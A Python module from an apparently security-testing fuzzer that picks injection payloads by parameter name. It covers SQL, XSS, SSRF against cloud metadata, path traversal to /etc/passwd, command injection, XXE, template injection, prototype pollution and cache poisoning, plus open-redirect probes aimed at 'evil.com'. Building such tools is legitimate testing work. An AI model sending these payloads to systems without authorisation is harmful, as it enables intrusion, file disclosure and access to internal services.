"""Smart payload heuristics — map parameter names to vuln-class payload bundles.

Used by `fuzz_parameter(smart_payloads=True)` so the operator doesn't have
to hand-pick payloads for every parameter. Heuristic only — when the name
hint is wrong, pass an explicit payload list.
"""

# Smart payload mapping based on parameter name heuristics.
_SMART_PAYLOAD_MAP = {
    "sqli": {
        "names": ["id", "uid", "pid", "user_id", "account_id", "order_id", "item_id",
                  "product_id", "num", "number", "count", "page", "limit", "offset"],
        # Tautology "1 OR 1=1" removed — on UPDATE/DELETE WHERE clauses it
        # matches every row (rule 8). Boolean-based detection stays via the
        # AND '1'='1 / AND '1'='2 pair; error-based stays via bare quote;
        # time-based stays via WAITFOR/SLEEP. Caller can pass OR-1=1 explicitly
        # when they've confirmed the endpoint is read-only.
        "payloads": ["'", "1' AND '1'='1", "1' AND '1'='2",
                     "1 UNION SELECT NULL--", "1; WAITFOR DELAY '0:0:3'--"],
    },
    "xss": {
        "names": ["search", "q", "query", "keyword", "name", "comment", "message",
                  "title", "description", "text", "content", "value", "input", "email"],
        "payloads": ["<script>alert(1)</script>", "\" onmouseover=alert(1)", "<img src=x onerror=alert(1)>", "javascript:alert(1)", "'-alert(1)-'"],
    },
    "ssrf": {
        "names": ["url", "uri", "href", "link", "src", "source", "target", "dest",
                  "destination", "domain", "host", "site", "feed", "callback", "webhook"],
        "payloads": ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:22", "http://[::1]/", "http://0x7f000001/"],
    },
    "redirect": {
        "names": ["redirect", "redirect_uri", "redirect_url", "return", "return_url",
                  "next", "goto", "forward", "continue", "redir", "returnTo"],
        "payloads": ["https://evil.com", "//evil.com", "\\/\\/evil.com", "https://evil.com@target.com"],
    },
    "lfi": {
        "names": ["file", "filename", "path", "filepath", "dir", "directory", "folder",
                  "page", "include", "template", "load", "read", "doc", "document"],
        "payloads": ["../../../etc/passwd", "....//....//....//etc/passwd", "..%252f..%252f..%252fetc/passwd", "/etc/passwd"],
    },
    "cmdi": {
        "names": ["cmd", "command", "exec", "execute", "run", "ping", "ip", "address", "hostname"],
        "payloads": ["; id", "| id", "$(id)", "`id`", "& whoami"],
    },
    "ssti": {
        "names": ["template", "render", "view", "layout", "theme", "format", "output",
                  "preview", "display", "expression", "eval"],
        "payloads": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{7*7}"],
    },
    "nosql": {
        "names": ["username", "password", "email", "login", "user", "pass", "filter",
                  "where", "sort", "order", "populate", "select"],
        "payloads": ['{"$gt":""}', '{"$ne":null}', '{"$regex":".*"}', "' || 'a'=='a", "admin' || ''=='"],
    },
    "xxe": {
        "names": ["xml", "data", "soap", "payload", "content", "body", "feed", "rss", "wsdl"],
        "payloads": ['<?xml version="1.0"?><!DOCTYPE f [<!ENTITY x SYSTEM "file:///etc/passwd">]><f>&x;</f>',
                     '<?xml version="1.0"?><!DOCTYPE f [<!ENTITY x SYSTEM "file:///etc/hostname">]><f>&x;</f>'],
    },
    "crlf": {
        "names": ["url", "redirect", "return", "next", "goto", "dest", "host", "header",
                  "ref", "referer", "origin", "location"],
        "payloads": ["%0d%0aX-Injected: true", "%0d%0aSet-Cookie: evil=true",
                     "%0d%0a%0d%0a<script>alert(1)</script>", "\\r\\nX-Injected: true"],
    },
    "deserialization": {
        "names": ["data", "object", "payload", "token", "session", "viewstate", "state",
                  "serialized"],
        "payloads": ['O:8:"stdClass":0:{}', "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldA==",
                     '{"rce":"_$$ND_FUNC$$_function(){return 1}()"}', 'a:1:{s:4:"test";s:4:"test";}'],
    },
    "mass_assignment": {
        "names": ["role", "admin", "is_admin", "privilege", "permission", "group", "level",
                  "verified", "active", "approved", "is_staff", "credits", "balance", "plan"],
        "payloads": ['{"role":"admin"}', '{"is_admin":true}', '{"price":0}',
                     '{"discount":100}', '{"verified":true}'],
    },
    "prototype_pollution": {
        "names": ["__proto__", "constructor", "prototype", "merge", "extend", "clone", "config"],
        "payloads": ['{"__proto__":{"polluted":"true"}}', '{"constructor":{"prototype":{"polluted":"true"}}}',
                     '{"__proto__":{"status":510}}', '{"__proto__":{"admin":true}}',
                     '__proto__[polluted]=true', 'constructor[prototype][polluted]=true'],
    },
    "graphql": {
        "names": ["query", "mutation", "variables", "operationName", "graphql"],
        "payloads": ['{__schema{types{name}}}', '{__type(name:"Query"){fields{name}}}',
                     '{"query":"{__schema{types{name fields{name}}}}"}',
                     '[{"query":"{__typename}"},{"query":"{__typename}"}]'],
    },
    "cache_poison": {
        "names": ["cb", "cachebuster", "utm_source", "utm_content", "utm_campaign"],
        "payloads": ['"><script>alert(1)</script>', "evil.com", "/evil-path",
                     '<script>alert(document.domain)</script>'],
    },
}


def _matches_param_name(param_lower: str, target_name: str) -> bool:
    """Check if parameter name matches target, with word-boundary awareness for short names."""
    if param_lower == target_name:
        return True
    if len(target_name) <= 3:
        # Short names (id, ip, q): require word boundary (underscore, start, or end)
        return (
            param_lower.startswith(target_name + "_") or
            param_lower.endswith("_" + target_name) or
            f"_{target_name}_" in param_lower
        )
    # Longer names (search, command, file): substring match is safe
    return target_name in param_lower


def get_smart_payloads(param_name: str) -> list[str]:
    """Auto-select payloads based on parameter name heuristics."""
    param_lower = param_name.lower()
    payloads = []
    for config in _SMART_PAYLOAD_MAP.values():
        if param_lower in config["names"] or any(_matches_param_name(param_lower, n) for n in config["names"]):
            payloads.extend(config["payloads"])
    if not payloads:
        payloads = ["'", "<script>alert(1)</script>", "{{7*7}}", "../../../etc/passwd", "; id"]
    return payloads
